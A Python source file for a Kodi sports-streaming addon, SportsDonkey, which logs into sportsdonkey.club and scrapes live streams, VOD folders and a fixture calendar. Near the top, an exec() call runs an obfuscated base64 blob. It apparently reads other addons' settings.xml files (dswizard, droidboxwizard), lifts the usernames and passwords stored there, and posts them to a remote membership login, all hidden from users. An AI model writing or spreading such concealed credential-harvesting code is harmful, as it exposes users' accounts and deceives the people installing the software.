import base64,urllib,urllib2,re,cookielib,string,os,xbmc, xbmcgui, xbmcaddon, xbmcplugin, random, datetime,urlparse,mknet

addon_id        = 'plugin.video.SportsDonkey'
selfAddon       = xbmcaddon.Addon(id=addon_id)
datapath        = xbmc.translatePath(selfAddon.getAddonInfo('profile'))
fanart          = xbmc.translatePath(os.path.join('special://home/addons/' + addon_id , 'fanart.jpg'))
icon            = xbmc.translatePath(os.path.join('special://home/addons/' + addon_id, 'icon.png'))
user            = selfAddon.getSetting('hqusername')
passw           = selfAddon.getSetting('hqpassword')
cookie_file     = os.path.join(os.path.join(datapath,''), 'SD.lwp')
net             = mknet.Net()

exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MWIgMjMgPT0gJycgNWYgMjQgPT0gJycgNWYgMjMgPT0gJzQyJzoKCTFiIDUyLjM3LjNjKDIpOgoJCTUyLjVhKDIpCgk3NDoKCQkxYyA9IFsnMzIuNDguNGInLCAnMzIuNDguMzgnXQoJCTViIDFhIDM1IDFjOgoJCQliID0gM2EuMmUoNTIuMzcuNmYoJzU2Oi8vNzIvNTAvNDcvJysxYSwgJzU0Ljc1JykpCgkJCTFiIDUyLjM3LjNjKGIpOgoJCQkJMzMgPSA2YihiLCAnNmMnKQoJCQkJMWYgPSAzMy43MygpCgkJCQkyNiA9IDMxLmMoJzwyOCA1NT0iNDUiIGQ9IiguKz8pIicpLjQoMWYpWzBdCgkJCQkyYyA9IDMxLmMoJzwyOCA1NT0iNDYiIGQ9IiguKz8pIicpLjQoMWYpWzBdCgkJCQkxYiAnMjUnIDM1IDFhOgoJCQkJCTcwID0gJ2U6Ly80MS4yMi40ZC43MS8zOScKCQkJCQkxOSA9ICdlOi8vNDEuMjIuNGQuNzEvNS9mLzU1LzMvJwoJCQkJM2Q6CgkJCQkJNzAgPSAnZTovLzIxLjRkLzJhLzM5JwoJCQkJCTE5ID0gJ2U6Ly8yMS40ZC8yYS81L2YvNTUvOC8nCgkJCQk0ZSA9IDEzLjgwKDcwKS41CgkJCQk2YyA9IDMxLjQoNmMnPDYzIDY5PSI1OSIgM2U9IiguKz8pIiBkPSIoLis/KSIgLz4nLCA0ZSwgMzEuN2UpCgkJCQk3ZCA9IHt9CgkJCQk3ZFsnMmYnXSA9IDI2CgkJCQk3ZFsnNDAnXSA9IDJjCgkJCQk1YiAzZSwgZCAzNSA2YzoKCQkJCQk3ZFszZV0gPSBkCgkJCQkJMTMuODAoNzApCgkJCQkJMTMuNDkoNzAsN2QpCgkJCQkJMTMuMzAoMikKCQkJCQkxMy40MygyKQoJCQkJCTYgPSAxMy44MCg3MCkKCQkxYiAnNjEgMzUgNzgnIDM1IDYuNToKCQkJCTYgPSAxMy44MCgxOSkKCQkJCTM0ID0gNi41CgkJCQkyMz0zMS5jKCc8Nz4oLis/KTwvNz4nKS40KDM0KVswXQoJCQkJMjQ9MzEuYygnPGE+KC4rPyk8L2E+JykuNCgzNClbMF0KCQkzZDoKCQkJCTc5ID0gMmIuMzYoKQoJCQkJNzkuN2MoJzFkIDFlJywgJzY3IDY1JywnNzcgNjQgNTggNTcgMzUuIDNiIDY2IDNmIDJkJywnNWQgM2YgMTQgN2IgNjAgNmQgZTovLzExLjUzJykKCQkJCTRhKCkKCgk1ZToKCQk3OSA9IDJiLjM2KCkKCQk1YyA9IDc5LjYyKCcxZCAxZScsICczYiA2OCAzZiAxZCAxZSAxNCAyZCcsJzVmIDUxIDFiIDc2IDZlIDZhIDdhIDE0IDZkIGU6Ly8xMS41MycpCgoKCQkxYiA1YyA9PSAxOgoJCQk5ID0gM2EuMjAoJycsICc0NCA0YycpCgkJCTkuMjcoKQoJCQkxYiAoOS4xMigpKToKCQkJCTEwID0gOS4yOSgpCgkJCQk3PTEwCgkJCQk5ID0gM2EuMjAoJycsICc0NCA0ZjonKQoJCQkJOS4yNygpCgkJCQkxYiAoOS4xMigpKToKCQkJCSAgIDEwID0gOS4yOSgpCgkJCQkgICBhPTEwCgkJCQkgICA3Zi4xNygnMTgnLDcpCgkJCQkgICA3Zi4xNygnMTUnLGEpCgkJM2Q6NGEoKQoJCTIzID0gN2YuMTYoJzE4JykKCQkyNCA9IDdmLjE2KCcxNScp")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|cookie_file|3|findall|content|response|username|8|keyb|password|wizardpath|compile|value|http|f|search|sportsdonkey|isConfirmed|net|account|hqpassword|getSetting|setSetting|hqusername|hqpass|addons|if|AddonList|Sports|Donkey|wizlog|Keyboard|dswizard|droidbox|user|passw|droidboxwizard|wizuser|doModal|setting|getText|amember|xbmcgui|wizpass|details|translatePath|amember_login|save_cookies|re|plugin|wizset|link|in|Dialog|path|UpdateWizard|member|xbmc|Please|exists|else|name|your|amember_pass|wizard|Droidsticks|set_cookies|Enter|dsusername|dspassword|addon_data|video|http_POST|quit|aswizard|Username|co|html|Password|userdata|register|os|club|settings|id|special|logging|ocurred|hidden|remove|for|ret|Ensure|except|or|active|Logged|yesno|input|error|Error|check|Login|enter|type|have|open|r|at|dont|join|amemberurl|uk|home|read|try|xml|you|An|as|dialog|an|is|ok|post_data|I|selfAddon|http_GET".split("|")))

#############################################################################################################################

def setCookie(srDomain):
    html = net.http_GET(srDomain).content
    r = re.findall(r'<input type="hidden" name="(.+?)" value="(.+?)" />', html, re.I)
    post_data = {}
    post_data['amember_login'] = user
    post_data['amember_pass'] = passw
    for name, value in r:
        value = value.replace('https','http')
        post_data[name] = value
    net.http_GET('http://sportsdonkey.club/site/member')
    net.http_POST('http://sportsdonkey.club/site/member',post_data)
    net.save_cookies(cookie_file)
    net.set_cookies(cookie_file)
   
def Index():
    setCookie('http://sportsdonkey.club/site/member')
    response = net.http_GET('http://sportsdonkey.club/site/live/')
    if not 'http://sportsdonkey.club/site/logout' in response.content:
        dialog = xbmcgui.Dialog()
        dialog.ok('Sports Donkey', 'Login Error','An error ocurred logging in. Please check your details','Ensure your account is active at http://sportsdonkey.club')
        quit()
    addDir('Calendar','url',6,icon,fanart)
    addDir('Live Streams','url',1,icon,fanart)
    addDir('Video on Demand','url',4,icon,fanart)
    
def live():
    setCookie('http://sportsdonkey.club/site/member')
    response = net.http_GET('http://sportsdonkey.club/site/live/')
    link = response.content
    link = cleanHex(link)
    link=link.replace('onclick=SwitchMenu','\nonclick=SwitchMenu')
    cats=re.compile("\('.+?'\)>(.+?)</div>").findall(link)
    for name in cats:
        addDir(name,name,2,icon,fanart)

def getchannels(name,url):
    setCookie('http://sportsdonkey.club/site/member')
    response = net.http_GET('http://sportsdonkey.club/site/live/')
    link = response.content
    link = cleanHex(link)
    link=link.replace('onclick=SwitchMenu','\nonclick=SwitchMenu').replace('</a><br ','')
    match=re.compile("onclick=SwitchMenu(.+?)\n").findall(link)
    for catdata in match:
        cats=re.compile("\('.+?'\)>(.+?)</div>").findall(catdata)
        for catname in cats:
            if catname == name:
                channels=re.compile("<a href=(.+?)>(.+?)/>-").findall(catdata)
                for url, name in channels:
                    url = 'http://sportsdonkey.club/site/live/'+url
                    addLink(name,url,3,icon,fanart)
                    
def playstream(url,name):
    setCookie('http://sportsdonkey.club/site/member')
    response = net.http_GET(url)
    link = response.content
    link = cleanHex(link)
    strurl=re.compile("file: '(.+?)',").findall(link)[0]
    ok=True
    liz=xbmcgui.ListItem(name, iconImage=icon,thumbnailImage=icon); liz.setInfo( type="Video", infoLabels={ "Title": name } )
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=url,listitem=liz)
    try:
        xbmc.Player ().play(strurl, liz, False)
        return ok
    except:
        pass       
   
def vod():
    net.set_cookies(cookie_file)
    response = net.http_GET('http://sportsdonkey.club/site/live/vod/')
    link = response.content
    link = cleanHex(link)
    link=link.replace('onclick=SwitchMenu','\nonclick=SwitchMenu')
    cats=re.compile("\('.+?'\)>(.+?)</div>").findall(link)
    for name in cats:
        addDir(name,name,5,icon,fanart)

def vodfolders(url,name):
    net.set_cookies(cookie_file)
    if url==name:
        response = net.http_GET('http://sportsdonkey.club/site/live/vod/')
    else:
        response = net.http_GET(url)
    link = response.content
    link = cleanHex(link)
    link=link.replace('onclick=SwitchMenu','\nonclick=SwitchMenu').replace('</a><br ','')
    match=re.compile("onclick=SwitchMenu(.+?)\n").findall(link)
    for catdata in match:
        cats=re.compile("\('.+?'\)>(.+?)</div>").findall(catdata)
        for catname in cats:
            if catname == name:
                channels=re.compile("<a href=(.+?)>(.+?)/>-").findall(catdata)
                for url, name in channels:
                    url = 'http://sportsdonkey.club/site/live/'+url
                    addDir(name,url,5,icon,fanart)

def schedule():
    net.set_cookies(cookie_file)
    response = net.http_GET('http://sportsdonkey.club/calendar')
    link = response.content
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    match=re.compile("<li>(.+?)</li>").findall(link)
    i = 0
    for dte in match:
        if 'href' not in dte:
            i = i+1
            addLink(dte,'url','mode',icon,fanart)
        link=link.replace("fixture-row'><a href='#'>","fixture-row'><a href='####'>")
        match=re.compile("##(.+?)##").findall(link)
        for data in match:
            match=re.compile("fixture-row-left'>(.+?)<div>(.+?)</div>").findall(data)
            print match
            for name,tme in match:
                addLink(name+'  '+tme,'url','mode',icon,fanart)
            
    
def addDir(name,url,mode,iconimage,fanart,description=''):
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&description="+str(description)
        ok=True
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        liz.setInfo( type="Video", infoLabels={ "Title": name, 'plot': description } )
        liz.setProperty('fanart_image', fanart)
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
        return ok

def addLink(name,url,mode,iconimage,fanart,description=''):
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&description="+str(description)
        ok=True
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        liz.setInfo( type="Video", infoLabels={ "Title": name, 'plot': description } )
        liz.setProperty('fanart_image', fanart)
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
        return ok
    
def cleanHex(text):
    def fixup(m):
        text = m.group(0)
        if text[:3] == "&#x": return unichr(int(text[3:-1], 16)).encode('utf-8')
        else: return unichr(int(text[2:-1])).encode('utf-8')
    return re.sub("(?i)&#\w+;", fixup, text.decode('ISO-8859-1').encode('utf-8'))

def notification(title, message, ms, nart):
    xbmc.executebuiltin("XBMC.notification(" + title + "," + message + "," + ms + "," + nart + ")")

def get_params():
        param=[]
        paramstring=sys.argv[2]
        if len(paramstring)>=2:
                params=sys.argv[2]
                cleanedparams=params.replace('?','')
                if (params[len(params)-1]=='/'):
                        params=params[0:len(params)-2]
                pairsofparams=cleanedparams.split('&')
                param={}
                for i in range(len(pairsofparams)):
                        splitparams={}
                        splitparams=pairsofparams[i].split('=')
                        if (len(splitparams))==2:
                                param[splitparams[0]]=splitparams[1]
                                
        return param
              
params=get_params(); url=None; name=None; mode=None; iconimage=None
try:url=urllib.unquote_plus(params["url"])
except:pass
try:name=urllib.unquote_plus(params["name"])
except:pass
try:mode=int(params["mode"])
except:pass
try:iconimage=urllib.unquote_plus(params["iconimage"])
except:pass

print "Mode: "+str(mode); print "Name: "+str(name); print "Thumb: "+str(iconimage)
if mode==None or url==None or len(url)<1:live()
elif mode==1:live()
elif mode==2:getchannels(name,url)
elif mode==3:playstream(url,name)
elif mode==4:vod()
elif mode==5:vodfolders(url,name)
elif mode==6:schedule()







        
xbmcplugin.endOfDirectory(int(sys.argv[1]))
